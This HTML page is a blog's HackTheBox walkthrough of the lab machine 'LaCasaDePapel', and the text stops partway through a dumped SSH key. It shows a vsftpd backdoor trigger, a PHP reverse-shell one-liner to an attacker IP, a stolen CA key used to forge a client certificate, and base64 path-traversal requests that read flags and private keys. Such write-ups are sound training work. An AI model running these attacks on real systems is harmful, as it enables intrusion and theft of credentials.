@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="LaCasaDePapel | blah blah Recon m4rc0ff@SittingDucks:~$ nmap -sV -sC 10.10.10.131 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 12:14 BST Nmap...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>LaCasaDePapel</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-06-11 11:19:00+01:00">Thu 11 June 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/LaCasaDePapel.html">LaCasaDePapel</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/LaCasaDePapel.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>blah blah</p>
+<h1 id="recon">Recon</h1>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -sV -sC <span class="m">10</span>.10.10.131
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 12:14 BST</span>
+<span class="go">Nmap scan report for 10.10.10.131</span>
+<span class="go">Host is up (0.23s latency).</span>
+<span class="go">Not shown: 996 closed ports</span>
+<span class="go">PORT    STATE SERVICE  VERSION</span>
+<span class="go">21/tcp  open  ftp      vsftpd 2.3.4</span>
+<span class="go">22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)</span>
+<span class="go">| ssh-hostkey: </span>
+<span class="go">|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)</span>
+<span class="go">|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)</span>
+<span class="go">|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)</span>
+<span class="go">80/tcp  open  http     Node.js (Express middleware)</span>
+<span class="go">|_http-title: La Casa De Papel</span>
+<span class="go">443/tcp open  ssl/http Node.js Express framework</span>
+<span class="go">| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel</span>
+<span class="go">| Not valid before: 2019-01-27T08:35:30</span>
+<span class="go">|_Not valid after:  2029-01-24T08:35:30</span>
+<span class="go">|_ssl-date: TLS randomness does not represent time</span>
+<span class="go">| tls-alpn: </span>
+<span class="go">|_  http/1.1</span>
+<span class="go">| tls-nextprotoneg: </span>
+<span class="go">|   http/1.1</span>
+<span class="go">|_  http/1.0</span>
+<span class="go">Service Info: OS: Unix</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 181.74 seconds</span>
+</pre></div>
+
+
+<p>The default web page shows this:</p>
+<p><img alt="" src="../images/lacasadepapel-home.png"></p>
+<p>Nothing really interesting on it, as we as on its html code.</p>
+<p>Port 443 is open as well and there is a common name mentioned, that is <code>lacasadepapel.htb</code>. So I add this to my <code>/etc/hosts</code> file and I browse to that web page:</p>
+<p><img alt="" src="../images/lacasadepapel-home443.png"></p>
+<p>This time I am asked about client certificate to continue view the web page. </p>
+<p>I started <code>gobuster</code> on both pages. The http page is extremely slow and seems not to produce any results while the https page gives an error, I guess related to the certificate. I put this on the background and go ahead with some more enumeration.</p>
+<h2 id="vsftpd-234">vsftpd 2.3.4</h2>
+<p>There is a <a href="https://security.appspot.com/vsftpd.html">vsftd</a> v 2.3.4 running on the target box. </p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> searchsploit vsftpd <span class="m">2</span>.3.4
+<span class="go">---------------------------------------------------- ---------------------------------</span>
+<span class="go"> Exploit Title                                      |  Path</span>
+<span class="go">---------------------------------------------------- ---------------------------------</span>
+<span class="go">vsftpd 2.3.4 - Backdoor Command Execution (Metasplo | unix/remote/17491.rb</span>
+<span class="go">---------------------------------------------------- ---------------------------------</span>
+</pre></div>
+
+
+<p><code>searchsploit</code> shows only one exploit related to a backdoored version of the program. The explot involves using <code>metasploit</code> which I want to avoid using for learning purposes.</p>
+<p>Doing a little more research I found more information on this <a href="https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html">blog post</a> by Chris Evans, the author of <code>vsftpd</code>. </p>
+<p>Apparently in 2011 the site where he was hosting the program was compromised and the attacker/s managed to upload a backdoored version. The backdoor version (code available <a href="https://pastebin.com/AetT9sS5">here</a>) would allow an attacker to spawn a <a href="https://psysh.org/">psy</a> shell (an interactive shell for PHP similar to a python interactive shell) on port 6200 if the USER that attemps to login contains a smiley face in the name, <code>:)</code>. The password can be anything. </p>
+<p>If we simply try to connect to the server on port 6200, this is what we get:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nc <span class="m">10</span>.10.10.131 <span class="m">6200</span>
+<span class="gp gp-VirtualEnv">(UNKNOWN)</span> <span class="go">[10.10.10.131] 6200 (?) : Connection refused</span>
+</pre></div>
+
+
+<p>Now, let's trigger the backdoor with the smiley face:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nc <span class="m">10</span>.10.10.131 <span class="m">21</span>
+<span class="go">220 (vsFTPd 2.3.4)</span>
+<span class="go">USER m4rc0ff:)</span>
+<span class="go">331 Please specify the password.</span>
+<span class="go">PASS SittingDucks</span>
+</pre></div>
+
+
+<p>As you can see from the above snippet I have used the user <code>m4rc0ff:)</code> which contains a smiley face at the end and the password <code>SittingDucks</code>. If the server is affected by the vulnerability, what we did above should have triggered the backdoor. Let's verify</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nc <span class="m">10</span>.10.10.131 <span class="m">6200</span>
+<span class="go">Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman</span>
+<span class="go">get_current_user()</span>
+<span class="go">=&gt; &quot;root&quot;</span>
+</pre></div>
+
+
+<p>As shown above I am able to connect to the server on port 6200 and get a Psy Shell. When running the psy command <code>get_current_user()</code> we get "root" as a result which is a very good sign. Now we need to find a way to get our flags or better, as I always prefer, to get a proper shell.</p>
+<p>To get a bash shell I do type the following in the psy shell:</p>
+<div class="highlight"><pre><span></span><span class="x">`$sock=fsockopen(&quot;10.10.14.29&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);`</span>
+<span class="x">PHP Warning:  shell_exec() has been disabled for security reasons in phar://eval()&#39;d code on line 1</span>
+</pre></div>
+
+
+<p>To my disappointment it seems that all the functions I can think of such as <code>shell_exec()</code> , as well as <code>exec()</code> and and <code>system()</code>, have been disabled meaning that we won't be able use these to get a reverse shell. We can also see a list of disabled functions from running the <code>phpinfo()</code> command in the shell:</p>
+<div class="highlight"><pre><span></span>&lt;SNIP&gt;
+disable_functions =&gt; exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source =&gt; exec,passthru,shell_exec,system,proc_open,popen,
+curl_exec,curl_multi_exec,parse_ini_file,show_source 
+&lt;SNIP&gt;
+</pre></div>
+
+
+<p>We can, however, use some other PHP functions such as <code>scandir()</code> to list what's inside a directory and <code>file_get_contents()</code> to read files:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nc <span class="m">10</span>.10.10.131 <span class="m">6200</span>
+<span class="go">Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman</span>
+<span class="go">scandir(&#39;.&#39;)    </span>
+<span class="go">=&gt; [</span>
+<span class="go">     &quot;.&quot;,</span>
+<span class="go">     &quot;..&quot;,</span>
+<span class="go">     &quot;.DS_Store&quot;,</span>
+<span class="go">     &quot;._.DS_Store&quot;,</span>
+<span class="go">     &quot;bin&quot;,</span>
+<span class="go">     &quot;boot&quot;,</span>
+<span class="go">     &quot;dev&quot;,</span>
+<span class="go">     &quot;etc&quot;,</span>
+<span class="go">     &quot;home&quot;,</span>
+<span class="go">     &quot;lib&quot;,</span>
+<span class="go">     &quot;lost+found&quot;,</span>
+<span class="go">     &quot;media&quot;,</span>
+<span class="go">     &quot;mnt&quot;,</span>
+<span class="go">     &quot;opt&quot;,</span>
+<span class="go">     &quot;proc&quot;,</span>
+<span class="go">     &quot;root&quot;,</span>
+<span class="go">     &quot;run&quot;,</span>
+<span class="go">     &quot;sbin&quot;,</span>
+<span class="go">     &quot;srv&quot;,</span>
+<span class="go">     &quot;swap&quot;,</span>
+<span class="go">     &quot;sys&quot;,</span>
+<span class="go">     &quot;tmp&quot;,</span>
+<span class="go">     &quot;usr&quot;,</span>
+<span class="go">     &quot;var&quot;,</span>
+<span class="go">   ]</span>
+<span class="go">scandir(&#39;/home&#39;)</span>
+<span class="go">=&gt; [</span>
+<span class="go">     &quot;.&quot;,</span>
+<span class="go">     &quot;..&quot;,</span>
+<span class="go">     &quot;berlin&quot;,</span>
+<span class="go">     &quot;dali&quot;,</span>
+<span class="go">     &quot;nairobi&quot;,</span>
+<span class="go">     &quot;oslo&quot;,</span>
+<span class="go">     &quot;professor&quot;,</span>
+<span class="go">   ]</span>
+<span class="go">scandir(&#39;/home/berlin&#39;)</span>
+<span class="go">=&gt; [</span>
+<span class="go">     &quot;.&quot;,</span>
+<span class="go">     &quot;..&quot;,</span>
+<span class="go">     &quot;.ash_history&quot;,</span>
+<span class="go">     &quot;.ssh&quot;,</span>
+<span class="go">     &quot;downloads&quot;,</span>
+<span class="go">     &quot;node_modules&quot;,</span>
+<span class="go">     &quot;server.js&quot;,</span>
+<span class="go">     &quot;user.txt&quot;,</span>
+<span class="go">   ]</span>
+</pre></div>
+
+
+<p>We can see there are different names under the <code>/home</code> directory indicating potential users. The <code>/home/berlin</code> directory shows the <code>user.txt</code> file but if we try to read it we get a permission error:</p>
+<div class="highlight"><pre><span></span><span class="go">file_get_contents(&#39;/home/berlin/user.txt&#39;)</span>
+<span class="go">PHP Warning:  file_get_contents(/home/berlin/user.txt): failed to open stream: Permission denied in phar://eval()&#39;d code on line 1</span>
+</pre></div>
+
+
+<p>We need to find another way to read the flag and get a bash shell!</p>
+<div class="highlight"><pre><span></span><span class="x">ls</span>
+<span class="x">Variables: $tokyo</span>
+</pre></div>
+
+
+<p>The <code>ls</code> command does not list what's on a directory but instead it lists variables, methods, etc. More information can be found with the <code>help</code> command: </p>
+<div class="highlight"><pre><span></span><span class="go">help</span>
+<span class="go">  help       Show a list of commands. Type `help [foo]` for information about [foo].      Aliases: ?                     </span>
+<span class="go">  ls         List local, instance or class variables, methods and constants.              Aliases: list, dir             </span>
+<span class="go">  dump       Dump an object or primitive.                                                                                </span>
+<span class="go">  doc        Read the documentation for an object, class, constant, method or property.   Aliases: rtfm, man             </span>
+<span class="go">  show       Show the code for an object, class, constant, method or property.                                           </span>
+<span class="go">  wtf        Show the backtrace of the most recent exception.                             Aliases: last-exception, wtf?  </span>
+<span class="go">  whereami   Show where you are in the code.                                                                             </span>
+<span class="go">  throw-up   Throw an exception or error out of the Psy Shell.                                                           </span>
+<span class="go">  timeit     Profiles with a timer.                                                                                      </span>
+<span class="go">  trace      Show the current call stack.                                                                                </span>
+<span class="go">  buffer     Show (or clear) the contents of the code input buffer.                       Aliases: buf                   </span>
+<span class="go">  clear      Clear the Psy Shell screen.                                                                                 </span>
+<span class="go">  edit       Open an external editor. Afterwards, get produced code in input buffer.                                     </span>
+<span class="go">  sudo       Evaluate PHP code, bypassing visibility restrictions.                                                       </span>
+<span class="go">  history    Show the Psy Shell history.                                                  Aliases: hist                  </span>
+<span class="go">  exit       End the current session and return to caller.                                Aliases: quit, q     </span>
+</pre></div>
+
+
+<p>Let's see what's inside <code>$tokyo</code>:</p>
+<div class="highlight"><pre><span></span><span class="x">show $tokyo</span>
+<span class="x">  &gt; 2| class Tokyo {</span>
+<span class="x">    3|  private function sign($caCert,$userCsr) {</span>
+<span class="x">    4|          $caKey = file_get_contents(&#39;/home/nairobi/ca.key&#39;);</span>
+<span class="x">    5|          $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, [&#39;digest_alg&#39;=&gt;&#39;sha256&#39;]);</span>
+<span class="x">    6|          openssl_x509_export($userCert, $userCertOut);</span>
+<span class="x">    7|          return $userCertOut;</span>
+<span class="x">    8|  }</span>
+<span class="x">    9| }</span>
+</pre></div>
+
+
+<p>We have a class <code>Tokyo</code> that in turn contains a function <code>sign</code> which uses a CA certificate key, <code>/home/nairobi/ca.key</code>, to sign user certificate requests (<code>$userCsr</code>) for 365 days using <code>openssl</code>. </p>
+<p>I think if we managed to sign our own certificate with this CA then we may use it to access the webpage we saw earlier. </p>
+<p>first off, let's grab the CA private key. To read a file we can use the PHP function <code>file_get_contents()</code></p>
+<div class="highlight"><pre><span></span><span class="go">file_get_contents(&#39;/home/nairobi/ca.key&#39;)</span>
+<span class="go">=&gt; &quot;&quot;&quot;</span>
+<span class="go">   -----BEGIN PRIVATE KEY-----\n</span>
+<span class="go">   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n</span>
+<span class="go">   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n</span>
+<span class="go">   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n</span>
+<span class="go">   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n</span>
+<span class="go">   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n</span>
+<span class="go">   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n</span>
+<span class="go">   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n</span>
+<span class="go">   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n</span>
+<span class="go">   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n</span>
+<span class="go">   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n</span>
+<span class="go">   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n</span>
+<span class="go">   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n</span>
+<span class="go">   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n</span>
+<span class="go">   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n</span>
+<span class="go">   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n</span>
+<span class="go">   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n</span>
+<span class="go">   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n</span>
+<span class="go">   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n</span>
+<span class="go">   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n</span>
+<span class="go">   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n</span>
+<span class="go">   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n</span>
+<span class="go">   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n</span>
+<span class="go">   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n</span>
+<span class="go">   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n</span>
+<span class="go">   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n</span>
+<span class="go">   53udBEzjt3WPqYGkkDknVhjD\n</span>
+<span class="go">   -----END PRIVATE KEY-----\n</span>
+<span class="go">   &quot;&quot;&quot;</span>
+</pre></div>
+
+
+<p>Now I will place this on a text file on my kali box, removing the <code>\n</code> at the end of each line. Then I can use <code>openssl</code> to create a client certificate we can later import into Firefox to allow access to the website we saw earlier. </p>
+<p>When we request a client certificate using <code>openssl</code> we will be asked interactively some information. We can grab some of the info of the server checking the certificate details from the browser:</p>
+<p><img alt="" src="../images/lacasadepapel-ServerCert.png"></p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/lacasadepapel$</span> openssl req -x509 -new -nodes -key ca.key -sha256 -days <span class="m">1024</span> -out SittingDucks.pem
+<span class="go">You are about to be asked to enter information that will be incorporated</span>
+<span class="go">into your certificate request.</span>
+<span class="go">What you are about to enter is what is called a Distinguished Name or a DN.</span>
+<span class="go">There are quite a few fields but you can leave some blank</span>
+<span class="go">For some fields there will be a default value,</span>
+<span class="go">If you enter &#39;.&#39;, the field will be left blank.</span>
+<span class="go">-----</span>
+<span class="go">Country Name (2 letter code) [AU]:</span>
+<span class="go">State or Province Name (full name) [Some-State]:</span>
+<span class="go">Locality Name (eg, city) []:</span>
+<span class="go">Organization Name (eg, company) [Internet Widgits Pty Ltd]:La Casa De Papel</span>
+<span class="go">Organizational Unit Name (eg, section) []:</span>
+<span class="go">Common Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb</span>
+<span class="go">Email Address []:</span>
+</pre></div>
+
+
+<p>Now, that I have created the certificate (<code>SittingDucks.pem</code>) I will convert it to <code>p12</code> format so that i will be able to import it to Firefox.</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/lacasadepapel$</span> openssl pkcs12 -export -in SittingDucks.pem -inkey ca.key -out SittingDucks.p12
+<span class="go">Enter Export Password:</span>
+<span class="go">Verifying - Enter Export Password:</span>
+</pre></div>
+
+
+<p>Then from Firefox preferences I go to "Certificate Manager" panel and select "Your Certificates" section. From there I click import </p>
+<p><img alt="" src="../images/lacasadepapel-cert-import.png"></p>
+<p>After this I was still presented with the old page telling me I needed a client certificate to access this page. I started clearing the cache and also remove the certificate exception I had previously allowed from the padlock in the browser. Once I did that I was prompted with this:</p>
+<p><img alt="" src="../images/lacasadepapel-newcert.png"></p>
+<p>This is the client certificate I had just created. Once I click on Ok, I land to this page:</p>
+<p><img alt="" src="../images/lacasadepapel-seasons.png"></p>
+<p>and if I visit one of the season links I get a list of <code>.avi</code> files:</p>
+<p><img alt="" src="../images/lacasadepapel-season1.png"></p>
+<p>Here is where the fun begins :)</p>
+<p>if I right click and open <code>01.avi</code> on a new tab I am directed to this URL:</p>
+<p><code>https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp</code></p>
+<p>the last part of the URL seems to be base64 encoded. If I decode it I see this:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> <span class="nb">echo</span> U0VBU09OLTEvMDEuYXZp<span class="p">|</span>base64 -d
+<span class="go">SEASON-1/01.avi</span>
+</pre></div>
+
+
+<p>More important if I try to go up and visit the parent directory (with <code>..</code>) I get this:</p>
+<p><img alt="" src="../images/lacasadepapel-seasonparent.png"></p>
+<p>This means the application is vulnerable to <a href="https://owasp.org/www-community/attacks/Path_Traversal">path traversal</a>. What we see seems exactly the content of <code>/home/berlin</code>  directory. </p>
+<p>Since we saw the objects of the URLs are base64 encoded I will encode <code>../user.txt</code> to see if we will be able to grab the flag:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> <span class="nb">echo</span> <span class="s2">&quot;../user.txt&quot;</span><span class="p">|</span>base64
+<span class="go">Li4vdXNlci50eHQ</span>
+</pre></div>
+
+
+<p>Then I will navigate to that page with <code>curl</code></p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> curl -k https://lacasadepapel.htb/file/Li4vdXNlci50eHQ
+<span class="go">4d****************************2d</span>
+</pre></div>
+
+
+<p>Great, we have the user flag!</p>
+<p>Moving another directory up, that is <code>../../</code>, I can see this all the other user directories as expected:</p>
+<p><img alt="" src="../images/lacasadepapel-users.png"></p>
+<p>Using the same process used to grab the <code>user.txt</code> file, I will grab the SSH private key, <code>id_rsa</code>, from the <code>berlin</code> directory:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> <span class="nb">echo</span> <span class="s2">&quot;../.ssh/id_rsa&quot;</span><span class="p">|</span>base64
+<span class="go">Li4vLnNzaC9pZF9yc2EK</span>
+<span class="gp">m4rc0ff@SittingDucks:~$</span> curl -k https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2EK
+<span class="go">curl: (52) Empty reply from server</span>
+<span class="gp">m4rc0ff@SittingDucks:~$</span> curl -k https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2EK
+<span class="go">curl: (7) Failed to connect to lacasadepapel.htb port 443: Connection refused</span>
+</pre></div>
+
+
+<p>Ops! For some reasons not only that didn't work but it also crashed the application listening on port 443. I had to do a box reset to bring it back but in one occasion I also had to switch the box off and then on again as the reset didn't work. This was super annoying!</p>
+<p>The issue was that in the example above I didn't use the <code>-n</code> option of the <code>echo</code> command which does not output the trailing new line. Funny enough this did not happen for the <code>user.txt</code> hence I was struggling a bit, but got it in the end:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> <span class="nb">echo</span> -n <span class="s2">&quot;../.ssh/id_rsa&quot;</span><span class="p">|</span>base64                     
+<span class="go">Li4vLnNzaC9pZF9yc2E=</span>
+<span class="gp">m4rc0ff@SittingDucks:~$</span> curl -k https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E<span class="o">=</span>
+<span class="go">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="go">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn</span>
+<span class="go">NhAAAAAwEAAQAAAgEAotH6Ygupi7JhjdbDXhg2f9xmzxaDNdxxEioAgH2GjUeUc4cJeTfU</span>
+<span class="go">/yWg1vyx1dXqanfwAzYOQLUgO9/rDbI9y51rTQnLhHsp/iFiGdvDO5iZwLNrwmzVLxgGc+</span>
+<span class="go">mNac3qxHcuHx7q+zQHB8NfU/qzyAL2/xsRkzBODRg21tsVqnTV83T8CFSBUO2jzitHFNjv</span>
+<span class="go">YbacP+Jn9Q5Y2HRdE03DWnAJJ7zk4SWWicM3riuuYyeqV6OYKboHwi+FB94Yx1xaPFGP7T</span>
+<span class="go">0jnBU3molURhKKolNqY78PE5qYplO/eO5H/7vKbrF7J5VtsVpvGQsmjqUhQK/GoYrMudIh</span>
+<span class="go">cfQSMUnpgWXYtCnIpBa53aY/fl0XYpL9a1ZQh1iGm4oleVnZNvqMa4mb+8kC8k3WDmw9pq</span>
+<span class="go">/W3eGVQ6Xeyj/4kUENe1Q8xj9BIXLZJwXYHtACLS4PaKZSRaFSjkc/26/T2958f2oBqJLf</span>
+<span class="go">+oxiydgcTI2vC34OYwwS7cOcSsS4HivUC6K7oJJHw3nUNoA2ge3cwiO6bNHrEKMJWOrMpp</span>
+<span class="go">9UH9BbQ/u7k5Ap7QF8yBfrdC64EAUzyZJXWde1NhSNjiI0rBqzCPZQGSOLEIFAwzU0bMIu</span>
+<span class="go">Ju4JIQOAH+3tfoh8ccUdNcmfH7LaT7pF3VYwyoPMowLpA8fG4FXGyvoyrfeTXC6GY0+1NV</span>
+<span class="go">UAAAdQRqG3BkahtwYAAAAHc3NoLXJzYQAAAgEAotH6Ygupi7JhjdbDXhg2f9xmzxaDNdxx</span>
+<span class="go">EioAgH2GjUeUc4cJeTfU/yWg1vyx1dXqanfwAzYOQLUgO9/rDbI9y51rTQnLhHsp/iFiGd</span>
+<span class="go">vDO5iZwLNrwmzVLxgGc+mNac3qxHcuHx7q+zQHB8NfU/qzyAL2/xsRkzBODRg21tsVqnTV</span>
+<span class="go">83T8CFSBUO2jzitHFNjvYbacP+Jn9Q5Y2HRdE03DWnAJJ7zk4SWWicM3riuuYyeqV6OYKb</span>
